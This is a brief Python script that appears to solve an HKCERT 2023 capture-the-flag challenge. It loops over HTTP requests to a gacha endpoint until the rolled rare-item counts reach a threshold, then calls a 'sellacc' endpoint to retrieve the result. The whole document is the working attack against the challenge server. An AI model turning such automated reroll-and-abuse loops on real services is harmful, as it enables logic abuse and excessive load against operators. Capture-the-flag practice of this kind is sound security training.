import asyncio
import aiohttp

CHAL_URL = "http://chal-a.hkcert23.pwnable.hk:28137/"

async def gacha_time(session):
    async with session.get(CHAL_URL + "?gacha10") as r:
        if r.status != 200:
            print("Failed to gacha")
            return
        return await r.text()

async def main():
    while True:
        async with aiohttp.ClientSession() as session:
            print("Rolling...!")
            await gacha_time(session)
            text = await gacha_time(session)
            UR = int(text.split("[UR] =>")[1].split("[")[0])
            SSR = int(text.split("[SSR] =>")[1].split("[")[0])
            if UR + SSR >= 20:
                async with session.get(CHAL_URL+"?sellacc") as r:
                    if r.status != 200:
                        print("Failed to sell acc")
                        return
                    print(await r.text())
                    break


if __name__ == "__main__":
    asyncio.run(main())